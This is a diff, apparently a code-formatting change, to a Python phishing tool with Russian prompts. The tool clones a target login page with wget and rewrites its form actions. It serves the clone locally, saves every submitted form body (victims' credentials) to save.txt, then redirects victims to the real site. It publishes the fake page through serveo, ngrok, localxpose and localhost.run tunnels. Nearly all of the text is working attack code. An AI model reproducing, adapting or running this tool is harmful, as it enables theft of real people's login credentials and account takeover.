@@ -19,7 +19,8 @@ os.system("clear")
 
 
 def BANNER():
-    print("""\033[1;34m
+    print(
+        """\033[1;34m
  █████░ █   ▒▓  ▒███▒ ██████ █████   ▓███▒ █    █
  █   ▓█ █  ▒█  ░█▒ ░█ █        █    █▓  ░█ █    █
  █    █ █ ▒█   █▒     █        █    █      █    █
@@ -70,15 +71,16 @@ _____________________¶¶¶¶¶¶¶¶¶¶
  \033
                                                                                 @pkgsearch        
 \033[1;33m [@]\033[1;39mАдрес сайта \033[1;33m= \033[1;39mhttps://www.wannadeauth.com \033[1;33m [@]\033[1;39mпорт \033[1;33m= \033[1;39m8080
-         """)
+         """
+    )
 
 
 BANNER()
 CURRENT_PATH = os.getcwd()
-DIRKR = os.path.join(CURRENT_PATH, '.tmp')
-INDEX_LOGIN = os.path.join(DIRKR, 'index.html')
-POST_SAVE = os.path.join(CURRENT_PATH, 'save.txt')
-NO = {'no', 'n'}
+DIRKR = os.path.join(CURRENT_PATH, ".tmp")
+INDEX_LOGIN = os.path.join(DIRKR, "index.html")
+POST_SAVE = os.path.join(CURRENT_PATH, "save.txt")
+NO = {"no", "n"}
 use_wget = "Y"
 if use_wget.lower() not in NO:
 
@@ -89,7 +91,9 @@ if use_wget.lower() not in NO:
     print("\033[1;31m")
     os.system(
         "wget -E -H -k -K -p -nH --cut-dirs=100 --referer=http://www.google.com -nv {} --user-agent {} --directory-prefix={}".format(
-            url, user_agent, DIRKR))
+            url, user_agent, DIRKR
+        )
+    )
     os.system("cp ngrok .tmp")
     os.system("cp loclx .tmp")
     os.system("clear")
@@ -107,16 +111,18 @@ if not os.path.isfile(INDEX_LOGIN):
     else:
 
         print("\033[1;33mглавная страница не определена :")
-        index_filename = input("\033[1;39m\n file in \033[1;33m .tmp/\033[1;39m определите главную страницу:\033[1;33m")
+        index_filename = input(
+            "\033[1;39m\n file in \033[1;33m .tmp/\033[1;39m определите главную страницу:\033[1;33m"
+        )
         os.rename(os.path.join(DIRKR, index_filename), INDEX_LOGIN)
 
         print("")
 
 redirect_ip = url
-page12 = open(INDEX_LOGIN, 'r').read()
+page12 = open(INDEX_LOGIN, "r").read()
 forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'
-page12 = re.sub(forms_pattern, r'\1\\redict\3', page12)
-with open(INDEX_LOGIN, 'wb') as file:
+page12 = re.sub(forms_pattern, r"\1\\redict\3", page12)
+with open(INDEX_LOGIN, "wb") as file:
     file.write(str.encode(page12))
 
 
@@ -137,7 +143,7 @@ class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):
 
-        content_length = int(self.headers['Content-Length'])
+        content_length = int(self.headers["Content-Length"])
         body = self.rfile.read(content_length)
         if self.path == "/redict":
             sys.stdout.write(GREEN)
@@ -146,10 +152,9 @@ class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.send_response(303)
             self.send_header("Location", "{}".format(redirect_ip))
 
-            with open(POST_SAVE, 'a+') as file:
+            with open(POST_SAVE, "a+") as file:
                 file.write(body.decode("utf-8"))
                 file.write("\n\n")
-
 
         else:
             self.send_response(308)
@@ -164,12 +169,15 @@ class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 def serverserveo():
     port11122 = PORT
     os.system(
-        "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &" % (
-            port11122))
+        "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &"
+        % (port11122)
+    )
     sleep(8)
     try:
         sleep(8)
-        output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url", shell=True)
+        output = check_output(
+            "grep -o 'https://[0-9a-z]*\.serveo.net' link.url", shell=True
+        )
         urlserveo = str(output).strip("b ' \ n")
         print("\n\t\033[1;33mSERVEO URL \033[1;39m: ", urlserveo)
     except CalledProcessError:
@@ -185,12 +193,15 @@ def subdomainserveo():
     else:
         pass
     os.system(
-        'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link111.url 2> /dev/null &' % (
-        linkserveo, port111))
+        "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link111.url 2> /dev/null &"
+        % (linkserveo, port111)
+    )
     sleep(8)
     try:
         sleep(8)
-        output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link111.url", shell=True)
+        output = check_output(
+            "grep -o '.\{0,0\}http.\{0,100\}' link111.url", shell=True
+        )
         urlserveo2 = str(output).strip("b ' \ n r")
         print("\n\t\033[1;33mSERVEO URL \033[1;39m: ", urlserveo2)
     except CalledProcessError:
@@ -202,11 +213,16 @@ def subdomainserveo():
 def subdomainxpose():
     port222 = PORT
     linkxpose = input("\n\t\033[1;33mSUBDOMAIN : \033[1;39m")
-    os.system('./loclx tunnel http --to :%s --subdomain %s > link222.url 2> /dev/null &' % (port222, linkxpose))
+    os.system(
+        "./loclx tunnel http --to :%s --subdomain %s > link222.url 2> /dev/null &"
+        % (port222, linkxpose)
+    )
     sleep(8)
     try:
         sleep(8)
-        output = check_output("grep -o 'https://[0-9a-z]*\.loclx.io' link222.url", shell=True)
+        output = check_output(
+            "grep -o 'https://[0-9a-z]*\.loclx.io' link222.url", shell=True
+        )
         urlxpose2 = str(output).strip("b ' \ n r")
         print("\n\t\033[1;33mLOCALXPOSE URL \033[1;39m: ", urlxpose2)
     except CalledProcessError:
@@ -220,8 +236,10 @@ def serverngrok():
     os.system("chmod +x ngrok")
     os.system("./ngrok http {} > /dev/null &".format(port22))
     sleep(8)
-    os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
-    urlFile = open('link2.url', 'r')
+    os.system(
+        'curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url'
+    )
+    urlFile = open("link2.url", "r")
     url = urlFile.read()
     urlFile.close()
     if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
@@ -231,8 +249,9 @@ def serverngrok():
 def serverLocalrun():
     port33333 = PORT
     os.system(
-        "xterm -hold -e 'ssh -T -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R 80:localhost:%s ssh.localhost.run > link44.url  ' &" % (
-            port33333))
+        "xterm -hold -e 'ssh -T -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R 80:localhost:%s ssh.localhost.run > link44.url  ' &"
+        % (port33333)
+    )
     sleep(8)
     os.system("grep -o '.\{0,0\}https.\{0,50\}' link44.url")
     try:
@@ -259,11 +278,13 @@ def serverLocalrun():
 
 def serverxpose():
     port33 = PORT
-    os.system('./loclx tunnel http --to :%s > link3.url 2> /dev/null &' % (port33))
+    os.system("./loclx tunnel http --to :%s > link3.url 2> /dev/null &" % (port33))
     sleep(8)
     try:
         sleep(8)
-        output = check_output("grep -o 'https://[0-9a-z]*\.loclx.io' link3.url", shell=True)
+        output = check_output(
+            "grep -o 'https://[0-9a-z]*\.loclx.io' link3.url", shell=True
+        )
         url = str(output).strip("b ' \ n r")
         print("\n\t\033[1;33mLOCALXPOSE URL \033[1;39m: " + url)
     except CalledProcessError:
@@ -277,11 +298,18 @@ def launch_server(port):
 
     try:
 
-        print("""
+        print(
+            """
                                                                                                                    Pkgsearch         
-         """)
-        print("\t\033[1;33m[@]\033[1;39murl\033[1;33m =\033[1;39m ", url, " ",
-              "\033[1;33m[@]\033[1;39mport\033[1;33m = \033[1;39m", PORT)
+         """
+        )
+        print(
+            "\t\033[1;33m[@]\033[1;39murl\033[1;33m =\033[1;39m ",
+            url,
+            " ",
+            "\033[1;33m[@]\033[1;39mport\033[1;33m = \033[1;39m",
+            PORT,
+        )
         print("\n\t\033[1;33mSTART SERVER : ")
         print("\n\t\033[1;33m1)\033[1;39mSERVEO  ")
         print("\n\t\033[1;33m2)\033[1;39mNGROK  ")
@@ -319,7 +347,10 @@ def launch_server(port):
             serverngrok()
 
         port33333 = 8080
-        os.system("ssh -T -R 80:localhost:%s ssh.localhost.run > link44.url 2> /dev/null &" % (port33333))
+        os.system(
+            "ssh -T -R 80:localhost:%s ssh.localhost.run > link44.url 2> /dev/null &"
+            % (port33333)
+        )
         httpd.serve_forever()
 
     except KeyboardInterrupt:
